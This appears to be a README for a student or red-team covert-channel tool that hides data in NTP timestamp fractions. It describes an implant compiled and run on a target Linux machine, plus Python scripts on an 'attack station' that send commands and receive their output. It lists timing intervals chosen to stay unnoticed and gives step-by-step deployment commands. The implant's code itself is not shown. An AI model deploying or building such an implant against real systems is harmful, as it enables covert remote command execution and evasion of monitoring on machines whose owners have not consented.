Killer Bees Kovert Bannel

Hijack NTP packets
Use the fraction portion of the time-stamp
32-bits per packet = 4 bytes
Normal interval = 64 seconds
Aggressive interval = 8 seconds
Blendy interval = 1 hour
invisible interval = 1 day lol

HOW TO USE:

1. Compile C code on target machine (Code is designed for linux)
    - ```gcc implant.c -o implant```
2. Ensure Python is installed and install NTP python library on Attack Station
    - ```pip install ntplib```
3. Run both python scripts in separate terminals on Attack Station
    - ```sudo python3 attackbox.py```
    - ```sudo python3 server.py```
4. Run C Code on target machine
    - ```./implant <timeInterval(s)> <Target IP> <Attack IP>```
5. Once you receive "Type your message" on attackbox terminal, input your desired command in and press enter
6. Receive output on server terminal
7. Be Happy :) <--- He has lipstic on VSCode